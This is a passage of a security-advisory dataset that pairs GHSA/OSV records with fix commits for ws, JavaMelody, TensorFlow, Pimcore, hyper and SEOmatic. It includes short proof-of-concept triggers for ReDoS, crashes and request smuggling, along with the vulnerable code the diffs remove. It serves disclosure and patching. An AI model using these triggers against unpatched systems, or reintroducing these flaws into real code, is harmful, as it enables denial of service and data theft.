`fractionalavgpoolgrad`.\n\npiperorigin-revid: 372420640\nchange-id: icc583928e6cdc3062e12498e4d2337a8fe3da016","language":"it","entities":"[('validate', 'ACTION', ''), ('372420640', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/fractional_avg_pool_op.cc'])","num_files":1.0},{"index":824,"vuln_id":"GHSA-6fc8-4gx4-v693","cwe_id":"{'CWE-400', 'CWE-345'}","score":5.3,"chain":"{'https:\/\/github.com\/websockets\/ws\/commit\/00c425ec77993773d823f018f64a5c44e17023ff'}","dataset":"osv","summary":"ReDoS in Sec-Websocket-Protocol header ### Impact\n\nA specially crafted value of the `Sec-Websocket-Protocol` header can be used to significantly slow down a ws server.\n\n### Proof of concept\n\n```js\nfor (const length of [1000, 2000, 4000, 8000, 16000, 32000]) {\n  const value = 'b' + ' '.repeat(length) + 'x';\n  const start = process.hrtime.bigint();\n\n  value.trim().split(\/ *, *\/);\n\n  const end = process.hrtime.bigint();\n\n  console.log('length = %d, time = %f ns', length, end - start);\n}\n```\n\n### Patches\n\nThe vulnerability was fixed in ws@7.4.6 (https:\/\/github.com\/websockets\/ws\/commit\/00c425ec77993773d823f018f64a5c44e17023ff) and backported to ws@6.2.2 (https:\/\/github.com\/websockets\/ws\/commit\/78c676d2a1acefbc05292e9f7ea0a9457704bf1b) and ws@5.2.3 (https:\/\/github.com\/websockets\/ws\/commit\/76d47c1479002022a3e4357b3c9f0e23a68d4cd2).\n\n### Workarounds\n\nIn vulnerable versions of ws, the issue can be mitigated by reducing the maximum allowed length of the request headers using the [`--max-http-header-size=size`](https:\/\/nodejs.org\/api\/cli.html#cli_max_http_header_size_size) and\/or the [`maxHeaderSize`](https:\/\/nodejs.org\/api\/http.html#http_http_createserver_options_requestlistener) options.\n\n### Credits\n\nThe vulnerability was responsibly disclosed along with a fix in private by [Robert McLaughlin](https:\/\/github.com\/robmcl4) from University of California, Santa Barbara.","published_date":"2021-05-28","chain_len":1,"project":"https:\/\/github.com\/websockets\/ws","commit_href":"https:\/\/github.com\/websockets\/ws\/commit\/00c425ec77993773d823f018f64a5c44e17023ff","commit_sha":"00c425ec77993773d823f018f64a5c44e17023ff","patch":"SINGLE","chain_ord":"['00c425ec77993773d823f018f64a5c44e17023ff']","before_first_fix_commit":"{'990306d1446faf346c76452409a4c11455690514'}","last_fix_commit":"00c425ec77993773d823f018f64a5c44e17023ff","chain_ord_pos":1.0,"commit_datetime":"05\/25\/2021, 09:00:58","message":"[security] Fix ReDoS vulnerability\n\nA specially crafted value of the `Sec-Websocket-Protocol` header could\nbe used to significantly slow down a ws server.\n\nPoC and fix were sent privately by Robert McLaughlin from University of\nCalifornia, Santa Barbara.","author":"Luigi Pinca","comments":null,"stats":"{'additions': 13, 'deletions': 1, 'total': 14}","files":"{'lib\/websocket-server.js': {'additions': 13, 'deletions': 1, 'changes': 14, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/websockets\/ws\/raw\/00c425ec77993773d823f018f64a5c44e17023ff\/lib%2Fwebsocket-server.js', 'patch': \"@@ -286,7 +286,7 @@ class WebSocketServer extends EventEmitter {\\n     let protocol = req.headers['sec-websocket-protocol'];\\n \\n     if (protocol) {\\n-      protocol = protocol.trim().split(\/ *, *\/);\\n+      protocol = protocol.split(',').map(trim);\\n \\n       \/\/\\n       \/\/ Optionally call external protocol selection handler.\\n@@ -404,3 +404,15 @@ function abortHandshake(socket, code, message, headers) {\\n   socket.removeListener('error', socketOnError);\\n   socket.destroy();\\n }\\n+\\n+\/**\\n+ * Remove whitespace characters from both ends of a string.\\n+ *\\n+ * @param {String} str The string\\n+ * @return {String} A new string representing `str` stripped of whitespace\\n+ *     characters from both its beginning and end\\n+ * @private\\n+ *\/\\n+function trim(str) {\\n+  return str.trim();\\n+}\"}}","message_norm":"[security] fix redos vulnerability\n\na specially crafted value of the `sec-websocket-protocol` header could\nbe used to significantly slow down a ws server.\n\npoc and fix were sent privately by robert mclaughlin from university of\ncalifornia, santa barbara.","language":"en","entities":"[('security', 'SECWORD', ''), ('fix', 'ACTION', ''), ('redos', 'SECWORD', ''), ('vulnerability', 'SECWORD', ''), ('protocol', 'SECWORD', ''), ('server', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/websocket-server.js'])","num_files":1.0},{"index":826,"vuln_id":"GHSA-6fvx-r7hx-3vh6","cwe_id":"{'CWE-611'}","score":9.8,"chain":"{'https:\/\/github.com\/javamelody\/javamelody\/commit\/ef111822562d0b9365bd3e671a75b65bd0613353'}","dataset":"osv","summary":"JavaMelody has XXE via parseSoapMethodName in bull\/javamelody\/PayloadNameRequestWrapper.java. JavaMelody before 1.74.0 has XXE via parseSoapMethodName in bull\/javamelody\/PayloadNameRequestWrapper.java.","published_date":"2018-10-17","chain_len":1,"project":"https:\/\/github.com\/javamelody\/javamelody","commit_href":"https:\/\/github.com\/javamelody\/javamelody\/commit\/ef111822562d0b9365bd3e671a75b65bd0613353","commit_sha":"ef111822562d0b9365bd3e671a75b65bd0613353","patch":"SINGLE","chain_ord":"['ef111822562d0b9365bd3e671a75b65bd0613353']","before_first_fix_commit":"{'00dd8d51a6483cb3a5b4c8ae9c24197028401c58'}","last_fix_commit":"ef111822562d0b9365bd3e671a75b65bd0613353","chain_ord_pos":1.0,"commit_datetime":"09\/04\/2018, 06:31:29","message":"fix for security","author":"evernat","comments":"{'com_1': {'author': 'abergmann', 'datetime': '10\/12\/2018, 08:21:37', 'body': '[CVE-2018-15531](https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2018-15531) was assigned to this issue.'}}","stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'javamelody-core\/src\/main\/java\/net\/bull\/javamelody\/PayloadNameRequestWrapper.java': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/javamelody\/javamelody\/raw\/ef111822562d0b9365bd3e671a75b65bd0613353\/javamelody-core%2Fsrc%2Fmain%2Fjava%2Fnet%2Fbull%2Fjavamelody%2FPayloadNameRequestWrapper.java', 'patch': '@@ -235,6 +235,8 @@ private static String parseSoapMethodName(InputStream stream, String charEncodin\\n \\t\\ttry {\\r\\n \\t\\t\\t\/\/ newInstance() et pas newFactory() pour java 1.5 (issue 367)\\r\\n \\t\\t\\tfinal XMLInputFactory factory = XMLInputFactory.newInstance();\\r\\n+\\t\\t\\tfactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); \/\/ disable DTDs entirely for that factory\\r\\n+\\t\\t\\tfactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); \/\/ disable external entities\\r\\n \\t\\t\\tfinal XMLStreamReader xmlReader;\\r\\n \\t\\t\\tif (charEncoding != null) {\\r\\n \\t\\t\\t\\txmlReader = factory.createXMLStreamReader(stream, charEncoding);'}}","message_norm":"fix for security","language":"en","entities":"[('fix', 'ACTION', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['javamelody-core\/src\/main\/java\/net\/bull\/javamelody\/PayloadNameRequestWrapper.java'])","num_files":1.0},{"index":831,"vuln_id":"GHSA-6g85-3hm8-83f9","cwe_id":"{'CWE-754'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20431e9044cf2ad3c0323c34888b192f3289af6b'}","dataset":"osv","summary":"CHECK-fail in `QuantizeAndDequantizeV4Grad` ### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in `tf.raw_ops.QuantizeAndDequantizeV4Grad`:\n\n```python\nimport tensorflow as tf\n\ngradient_tensor = tf.constant([0.0], shape=[1])\ninput_tensor = tf.constant([0.0], shape=[1])\ninput_min = tf.constant([[0.0]], shape=[1, 1])\ninput_max = tf.constant([[0.0]], shape=[1, 1])\n\ntf.raw_ops.QuantizeAndDequantizeV4Grad(\n  gradients=gradient_tensor, input=input_tensor,\n  input_min=input_min, input_max=input_max, axis=0)\n```                     \n                        \nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/95078c145b5a7a43ee046144005f733092756ab5\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc#L162-L163) does not validate the rank of the `input_*` tensors. In turn, this results in the tensors being passes as they are to [`QuantizeAndDequantizePerChannelGradientImpl`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/95078c145b5a7a43ee046144005f733092756ab5\/tensorflow\/core\/kernels\/quantize_and_dequantize_op.h#L295-L306):\n\n```cc \ntemplate <typename Device, typename T>\nstruct QuantizeAndDequantizePerChannelGradientImpl {\n  static void Compute(const Device& d,\n                      typename TTypes<T, 3>::ConstTensor gradient,\n                      typename TTypes<T, 3>::ConstTensor input,\n                      const Tensor* input_min_tensor,\n                      const Tensor* input_max_tensor,\n                      typename TTypes<T, 3>::Tensor input_backprop,\n                      typename TTypes<T>::Flat input_min_backprop,\n                      typename TTypes<T>::Flat input_max_backprop) {\n    ...\n    auto input_min = input_min_tensor->vec<T>();\n    auto input_max = input_max_tensor->vec<T>();\n    ...\n}\n```\n\nHowever, the `vec<T>` method, requires the rank to 1 and triggers a `CHECK` failure otherwise.\n\n### Patches\nWe have patched the issue in GitHub commit [20431e9044cf2ad3c0323c34888b192f3289af6b](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20431e9044cf2ad3c0323c34888b192f3289af6b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2 as this is the only other affected version.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/20431e9044cf2ad3c0323c34888b192f3289af6b","commit_sha":"20431e9044cf2ad3c0323c34888b192f3289af6b","patch":"SINGLE","chain_ord":"['20431e9044cf2ad3c0323c34888b192f3289af6b']","before_first_fix_commit":"{'95078c145b5a7a43ee046144005f733092756ab5'}","last_fix_commit":"20431e9044cf2ad3c0323c34888b192f3289af6b","chain_ord_pos":1.0,"commit_datetime":"04\/26\/2021, 20:43:59","message":"Fix `tf.raw_ops.QuantizeAndDequantizeV4Grad` CHECK failure.\n\nPiperOrigin-RevId: 370532425\nChange-Id: I767721be266851b63d8fe55e7ac6be0af6017f6c","author":"Amit Patankar","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/20431e9044cf2ad3c0323c34888b192f3289af6b\/tensorflow%2Fcore%2Fkernels%2Fquantize_and_dequantize_op.cc', 'patch': '@@ -160,7 +160,17 @@ class QuantizeAndDequantizeV4GradientOp : public OpKernel {\\n         errors::InvalidArgument(\"gradient and input must be the same size\"));\\n     const int depth = (axis_ == -1) ? 1 : input.dim_size(axis_);\\n     const Tensor& input_min_tensor = ctx->input(2);\\n+    OP_REQUIRES(ctx,\\n+                input_min_tensor.dims() == 0 || input_min_tensor.dims() == 1,\\n+                errors::InvalidArgument(\\n+                    \"Input min tensor must have dimension 1. Recieved \",\\n+                    input_min_tensor.dims(), \".\"));\\n     const Tensor& input_max_tensor = ctx->input(3);\\n+    OP_REQUIRES(ctx,\\n+                input_max_tensor.dims() == 0 || input_max_tensor.dims() == 1,\\n+                errors::InvalidArgument(\\n+                    \"Input max tensor must have dimension 1. Recieved \",\\n+                    input_max_tensor.dims(), \".\"));\\n     if (axis_ != -1) {\\n       OP_REQUIRES(\\n           ctx, input_min_tensor.dim_size(0) == depth,'}}","message_norm":"fix `tf.raw_ops.quantizeanddequantizev4grad` check failure.\n\npiperorigin-revid: 370532425\nchange-id: i767721be266851b63d8fe55e7ac6be0af6017f6c","language":"en","entities":"[('fix', 'ACTION', ''), ('370532425', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantize_and_dequantize_op.cc'])","num_files":1.0},{"index":835,"vuln_id":"GHSA-6gm7-j668-w6h9","cwe_id":"{'CWE-89'}","score":7.5,"chain":"{'https:\/\/github.com\/pimcore\/pimcore\/commit\/a697830359df06246acca502ee2455614de68017'}","dataset":"osv","summary":"SQL Injection in Pimcore Pimcore prior to version 10.3.5 is vulnerable SQL injection in RecyclebinController.php. This vulnerability affects data confidentiality.","published_date":"2022-04-09","chain_len":1,"project":"https:\/\/github.com\/pimcore\/pimcore","commit_href":"https:\/\/github.com\/pimcore\/pimcore\/commit\/a697830359df06246acca502ee2455614de68017","commit_sha":"a697830359df06246acca502ee2455614de68017","patch":"SINGLE","chain_ord":"['a697830359df06246acca502ee2455614de68017']","before_first_fix_commit":"{'e649598b4d2892c0bef9dea24cdf8f7006dc1ef1'}","last_fix_commit":"a697830359df06246acca502ee2455614de68017","chain_ord_pos":1.0,"commit_datetime":"04\/04\/2022, 08:59:41","message":"[Recyclebin] Quote condition filter","author":"dpahuja","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'bundles\/AdminBundle\/Controller\/Admin\/RecyclebinController.php': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/pimcore\/pimcore\/raw\/a697830359df06246acca502ee2455614de68017\/bundles%2FAdminBundle%2FController%2FAdmin%2FRecyclebinController.php', 'patch': '@@ -119,7 +119,7 @@ public function listAction(Request $request)\\n                         $condition = $field . \\' BETWEEN \\' . $db->quote($value) . \\' AND \\' . $db->quote($maxTime);\\n                         $conditionFilters[] = $condition;\\n                     } else {\\n-                        $conditionFilters[] = $field . $operator . \" \\'\" . $value . \"\\' \";\\n+                        $conditionFilters[] = $field . $operator . \\' \\' . $db->quote($value);\\n                     }\\n                 }\\n             }'}}","message_norm":"[recyclebin] quote condition filter","language":"it","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bundles\/AdminBundle\/Controller\/Admin\/RecyclebinController.php'])","num_files":1.0},{"index":836,"vuln_id":"GHSA-6gmv-pjp9-p8w8","cwe_id":"{'CWE-125'}","score":8.1,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/37c01fb5e25c3d80213060460196406c43d31995'}","dataset":"osv","summary":"Out of bounds read in Tensorflow ### Impact \nThe [implementation of shape inference for `ReverseSequence`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/ops\/array_ops.cc#L1636-L1671) does not fully validate the value of `batch_dim` and can result in a heap OOB read:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ReverseSequence(\n    input = ['aaa','bbb'],\n    seq_lengths = [1,1,1],\n    seq_dim = -10,\n    batch_dim = -10 )\n  return y\n    \ntest()\n```\n\nThere is a check to make sure the value of `batch_dim` does not go over the rank of the input, but there is no check for negative values:\n\n```cc\n  const int32_t input_rank = c->Rank(input);\n  if (batch_dim >= input_rank) {\n    return errors::InvalidArgument( \n        \"batch_dim must be < input rank: \", batch_dim, \" vs. \", input_rank);\n  }\n  \/\/ ...\n  \n  DimensionHandle batch_dim_dim = c->Dim(input, batch_dim);\n``` \n    \nNegative dimensions are allowed in some cases to mimic Python's negative indexing (i.e., indexing from the end of the array), however if the value is too negative then [the implementation of `Dim`](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/5100e359aef5c8021f2e71c7b986420b85ce7b3d\/tensorflow\/core\/framework\/shape_inference.h#L415-L428) would access elements before the start of an array:\n\n```cc\n  DimensionHandle Dim(ShapeHandle s, int64_t idx) {\n    if (!s.Handle() || s->rank_ == kUnknownRank) {\n      return UnknownDim();\n    }\n    return DimKnownRank(s, idx);\n  } \n\u00b7\n  static DimensionHandle DimKnownRank(ShapeHandle s, int64_t idx) {\n    CHECK_NE(s->rank_, kUnknownRank);\n    if (idx < 0) {\n      return s->dims_[s->dims_.size() + idx];\n    }\n    return s->dims_[idx];\n  }\n```\n\n### Patches\nWe have patched the issue in GitHub commit [37c01fb5e25c3d80213060460196406c43d31995](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/37c01fb5e25c3d80213060460196406c43d31995).\n\nThe fix will be included in TensorFlow 2.8.0. We will also cherrypick this commit on TensorFlow 2.7.1, TensorFlow 2.6.3, and TensorFlow 2.5.3, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yu Tian of Qihoo 360 AIVul Team.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/37c01fb5e25c3d80213060460196406c43d31995","commit_sha":"37c01fb5e25c3d80213060460196406c43d31995","patch":"SINGLE","chain_ord":"['37c01fb5e25c3d80213060460196406c43d31995']","before_first_fix_commit":"{'3218043d6d3a019756607643cf65574fbfef5d7a'}","last_fix_commit":"37c01fb5e25c3d80213060460196406c43d31995","chain_ord_pos":1.0,"commit_datetime":"11\/23\/2021, 22:27:30","message":"Fix out of bound error in ReverseSequence Op shape function\n\nPiperOrigin-RevId: 411896080\nChange-Id: I7e59a38e2f960886edf2b6c54ed5a84e86a9b193","author":"Isha Arkatkar","comments":null,"stats":"{'additions': 10, 'deletions': 0, 'total': 10}","files":"{'tensorflow\/core\/ops\/array_ops.cc': {'additions': 10, 'deletions': 0, 'changes': 10, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/37c01fb5e25c3d80213060460196406c43d31995\/tensorflow%2Fcore%2Fops%2Farray_ops.cc', 'patch': '@@ -1653,11 +1653,21 @@ REGISTER_OP(\"ReverseSequence\")\\n         return errors::InvalidArgument(\\n             \"batch_dim must be < input rank: \", batch_dim, \" vs. \", input_rank);\\n       }\\n+\\n       if (seq_dim >= input_rank) {\\n         return errors::InvalidArgument(\\n             \"seq_dim must be < input rank: \", seq_dim, \" vs. \", input_rank);\\n       }\\n \\n+      \/\/ To prevent out of bound access when calling c->Dim(input, batch_dim),\\n+      \/\/ batch_dim range [-1 * input rank, input rank) is allowed. However,\\n+      \/\/ the op implementation has a stricter bound for batch_dim requiring >= 0\\n+      \/\/ value. Thus, perform strict check here.\\n+      if (batch_dim < 0) {\\n+        return errors::InvalidArgument(\"batch_dim must be >=0, got \",\\n+                                       batch_dim);\\n+      }\\n+\\n       DimensionHandle batch_dim_dim = c->Dim(input, batch_dim);\\n       TF_RETURN_IF_ERROR(\\n           c->Merge(batch_dim_dim, c->Dim(seq_lens_shape, 0), &batch_dim_dim));'}}","message_norm":"fix out of bound error in reversesequence op shape function\n\npiperorigin-revid: 411896080\nchange-id: i7e59a38e2f960886edf2b6c54ed5a84e86a9b193","language":"en","entities":"[('fix', 'ACTION', ''), ('out of bound', 'SECWORD', ''), ('error', 'FLAW', ''), ('411896080', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/ops\/array_ops.cc'])","num_files":1.0},{"index":839,"vuln_id":"GHSA-6gv8-p3vj-pxvr","cwe_id":"{'CWE-476'}","score":7.7,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7bdf50bb4f5c54a4997c379092888546c97c3ebd'}","dataset":"osv","summary":"Null pointer dereference in `UncompressElement` ### Impact\nThe code for `tf.raw_ops.UncompressElement` can be made to trigger a null pointer dereference: \n\n```python\nimport tensorflow as tf\n\ndata = tf.data.Dataset.from_tensors([0.0])\ntf.raw_ops.UncompressElement(\n  compressed=tf.data.experimental.to_variant(data),\n  output_types=[tf.int64],\n  output_shapes=[2])\n```\n  \nThe [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/f24faa153ad31a4b51578f8181d3aaab77a1ddeb\/tensorflow\/core\/kernels\/data\/experimental\/compression_ops.cc#L50-L53) obtains a pointer to a `CompressedElement` from a `Variant` tensor and then proceeds to dereference it for decompressing. There is no check that the `Variant` tensor contained a `CompressedElement`, so the pointer is actually `nullptr`.\n\n### Patches\nWe have patched the issue in GitHub commit [7bdf50bb4f5c54a4997c379092888546c97c3ebd](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7bdf50bb4f5c54a4997c379092888546c97c3ebd).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/7bdf50bb4f5c54a4997c379092888546c97c3ebd","commit_sha":"7bdf50bb4f5c54a4997c379092888546c97c3ebd","patch":"SINGLE","chain_ord":"['7bdf50bb4f5c54a4997c379092888546c97c3ebd']","before_first_fix_commit":"{'a21a1226a1dbc08e257e4344324d5881fbd95d4e'}","last_fix_commit":"7bdf50bb4f5c54a4997c379092888546c97c3ebd","chain_ord_pos":1.0,"commit_datetime":"07\/10\/2021, 00:45:15","message":"Ensure non-empty compressed input in tf.raw_ops.UncompressElement\n\nPiperOrigin-RevId: 383955815\nChange-Id: I072a84fd02738dd2f51b3f42836ed80067dba4a8","author":"Laura Pak","comments":null,"stats":"{'additions': 5, 'deletions': 0, 'total': 5}","files":"{'tensorflow\/core\/kernels\/data\/experimental\/compression_ops.cc': {'additions': 5, 'deletions': 0, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/7bdf50bb4f5c54a4997c379092888546c97c3ebd\/tensorflow%2Fcore%2Fkernels%2Fdata%2Fexperimental%2Fcompression_ops.cc', 'patch': '@@ -48,6 +48,11 @@ void UncompressElementOp::Compute(OpKernelContext* ctx) {\\n   Tensor tensor = ctx->input(0);\\n   const Variant& variant = tensor.scalar<Variant>()();\\n   const CompressedElement* compressed = variant.get<CompressedElement>();\\n+  OP_REQUIRES(\\n+      ctx, compressed != nullptr,\\n+      errors::InvalidArgument(\\n+          \"Input does not contain a compressed element. Instead got tensor \",\\n+          tensor.DebugString()));\\n \\n   std::vector<Tensor> components;\\n   OP_REQUIRES_OK(ctx, UncompressElement(*compressed, &components));'}}","message_norm":"ensure non-empty compressed input in tf.raw_ops.uncompresselement\n\npiperorigin-revid: 383955815\nchange-id: i072a84fd02738dd2f51b3f42836ed80067dba4a8","language":"en","entities":"[('ensure', 'ACTION', ''), ('compressed', 'SECWORD', ''), ('tf.raw_ops.uncompresselement', 'SECWORD', ''), ('383955815', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/data\/experimental\/compression_ops.cc'])","num_files":1.0},{"index":847,"vuln_id":"GHSA-6hfq-h8hq-87mf","cwe_id":"{'CWE-444'}","score":4.8,"chain":"{'https:\/\/github.com\/hyperium\/hyper\/commit\/8f93123efef5c1361086688fe4f34c83c89cec02'}","dataset":"osv","summary":"HTTP Request Smuggling in hyper ### Summary\n\nhyper's HTTP server code had a flaw that incorrectly understands some requests with multiple transfer-encoding headers to have a chunked payload, when it should have been rejected as illegal. This combined with an upstream HTTP proxy that understands the request payload boundary differently can result in \"request smuggling\" or \"desync attacks\".\n\n### Vulnerability\n\nThe flaw was introduced in https:\/\/github.com\/hyperium\/hyper\/commit\/26417fc24a7d05df538e0f39239b373c5c3d61f6, released in v0.12.0.\n\nConsider this example request:\n\n```\nPOST \/yolo HTTP\/1.1\nTransfer-Encoding: chunked\nTransfer-Encoding: cow\n```\n\nThis request *should* be rejected, according to RFC 7230, since it has a `Transfer-Encoding` header, but after folding, it does not end in `chunked`. hyper would notice the `chunked` in the first line, and then check the second line, and thanks to a missing boolean assignment, *not* set the error condition. hyper would treat the payload as being `chunked`. By differing from the spec, it is possible to send requests like these to endpoints that have different HTTP implementations, with different interpretations of the payload semantics, and cause \"desync attacks\".\n\nThere are several parts of the spec that must also be checked, and hyper correctly handles all of those. Additionally, hyper's *client* does not allow sending requests with improper headers, so the misunderstanding cannot be propagated further.\n\nRead more about desync attacks: https:\/\/portswigger.net\/research\/http-desync-attacks-request-smuggling-reborn\n\n### Impact\n\nTo determine if vulnerable, all these things must be true:\n\n- **Using hyper as an HTTP *server*.** The client is not affected.\n- **Using HTTP\/1.1.** HTTP\/2 does not use `transfer-encoding`.\n- **Using a vulnerable HTTP proxy upstream to hyper.** If an upstream proxy correctly rejects the illegal transfer-encoding headers, the desync attack cannot succeed. If there is *no* proxy upstream of hyper, hyper cannot *start* the desync attack, as the client will repair the headers before forwarding.\n\n### Patches\n\nWe have released and backported the following patch versions:\n\n- v0.14.3\n- v0.13.10\n\n### Workarounds\n\nBesides upgrading hyper, you can take the following options:\n\n- Reject requests that contain a `transfer-encoding` header.\n- Ensure any upstream proxy handles `transfer-encoding` correctly.\n\n### Credits\n\nThis issue was initially reported by ZeddYu Lu From Qi An Xin Technology Research Institute.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/hyperium\/hyper","commit_href":"https:\/\/github.com\/hyperium\/hyper\/commit\/8f93123efef5c1361086688fe4f34c83c89cec02","commit_sha":"8f93123efef5c1361086688fe4f34c83c89cec02","patch":"SINGLE","chain_ord":"['8f93123efef5c1361086688fe4f34c83c89cec02']","before_first_fix_commit":"{'4d2125c67c8087de863f74278a017c4caf37e6a9'}","last_fix_commit":"8f93123efef5c1361086688fe4f34c83c89cec02","chain_ord_pos":1.0,"commit_datetime":"02\/05\/2021, 21:27:30","message":"fix(http1): fix server misinterpretting multiple Transfer-Encoding headers\n\nWhen a request arrived with multiple `Transfer-Encoding` headers, hyper\nwould check each if they ended with `chunked`. It should have only\nchecked if the *last* header ended with `chunked`.\n\nSee https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/GHSA-6hfq-h8hq-87mf","author":"Sean McArthur","comments":null,"stats":"{'additions': 12, 'deletions': 0, 'total': 12}","files":"{'src\/proto\/h1\/role.rs': {'additions': 12, 'deletions': 0, 'changes': 12, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/hyperium\/hyper\/raw\/8f93123efef5c1361086688fe4f34c83c89cec02\/src%2Fproto%2Fh1%2Frole.rs', 'patch': '@@ -213,6 +213,8 @@ impl Http1Transaction for Server {\\n                     if headers::is_chunked_(&value) {\\n                         is_te_chunked = true;\\n                         decoder = DecodedLength::CHUNKED;\\n+                    } else {\\n+                        is_te_chunked = false;\\n                     }\\n                 }\\n                 header::CONTENT_LENGTH => {\\n@@ -1444,6 +1446,16 @@ mod tests {\\n             \"transfer-encoding doesn\\'t end in chunked\",\\n         );\\n \\n+        parse_err(\\n+            \"\\\\\\n+             POST \/ HTTP\/1.1\\\\r\\\\n\\\\\\n+             transfer-encoding: chunked\\\\r\\\\n\\\\\\n+             transfer-encoding: afterlol\\\\r\\\\n\\\\\\n+             \\\\r\\\\n\\\\\\n+             \",\\n+            \"transfer-encoding multiple lines doesn\\'t end in chunked\",\\n+        );\\n+\\n         \/\/ http\/1.0\\n \\n         assert_eq!('}}","message_norm":"fix(http1): fix server misinterpretting multiple transfer-encoding headers\n\nwhen a request arrived with multiple `transfer-encoding` headers, hyper\nwould check each if they ended with `chunked`. it should have only\nchecked if the *last* header ended with `chunked`.\n\nsee https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/ghsa-6hfq-h8hq-87mf","language":"en","entities":"[('fix(http1', 'ACTION', ''), ('fix', 'ACTION', ''), ('server', 'SECWORD', ''), ('encoding', 'SECWORD', ''), ('encoding', 'SECWORD', ''), ('https:\/\/github.com\/hyperium\/hyper\/security\/advisories\/ghsa-6hfq-h8hq-87mf', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/proto\/h1\/role.rs'])","num_files":1.0},{"index":848,"vuln_id":"GHSA-6hjc-m38h-7jhh","cwe_id":"{'CWE-79'}","score":6.1,"chain":"{'https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/4e46b792ce973ac0c652fb330055f41aca1981c8', 'https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873'}","dataset":"osv","summary":"Cross-site Scripting in SEOmatic plugin A cross-site scripting (XSS) vulnerability in the SEOmatic plugin 3.4.10 for Craft CMS 3 allows remote attackers to inject arbitrary web script via a GET to \/index.php?action=seomatic\/file\/seo-file-link with url parameter containing the base64 encoded URL of a malicious web page \/ file and fileName parameter containing an arbitrary filename with the intended content-type to be rendered in the user's browser as the extension.","published_date":"2022-06-13","chain_len":2,"project":"https:\/\/github.com\/nystudio107\/craft-seomatic","commit_href":"https:\/\/github.com\/nystudio107\/craft-seomatic\/commit\/4e46b792ce973ac0c652fb330055f41aca1981c8","commit_sha":"4e46b792ce973ac0c652fb330055f41aca1981c8","patch":"MULTI","chain_ord":"['5f2cdc7c39e0a4bfb60d2f84131508f0a87b2873', 